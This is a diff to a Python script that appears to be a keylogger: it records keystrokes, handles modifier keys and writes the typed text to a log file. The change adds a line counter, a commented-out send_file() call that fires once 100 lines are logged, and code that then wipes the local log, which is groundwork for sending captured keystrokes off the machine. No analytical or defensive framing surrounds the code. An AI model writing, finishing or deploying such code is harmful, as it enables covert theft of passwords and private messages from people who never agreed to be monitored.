@@ -13,10 +13,10 @@ caps = False
 ctrl_l = False
 alt_r = False
 shift = False
-
+count_line = 0
 
 def list(k):
-    global liste, string, caps, ctrl_l, shift, alt_r
+    global liste, string, caps, ctrl_l, shift, alt_r, count_line
     if k == 'Key.space':
         liste.append(string + ' ')
         string = ''
@@ -32,6 +32,7 @@ def list(k):
             f.write("\n")
         liste = []
         string = ''
+        count_line += 1
     else:
         if caps is True:
             k = k.upper()
@@ -81,7 +82,13 @@ def list(k):
             if k[1] == "$":
                 k = "']'"
         string = string + k[1]
-
+    if count_line >= 100 :
+        try:
+            #send_file()
+            count_line = 0
+            open(namefile, "w").close()
+        except:
+            print('mdr')
 
 def on_release(key):
     global ctrl_l, alt_r, shift, caps
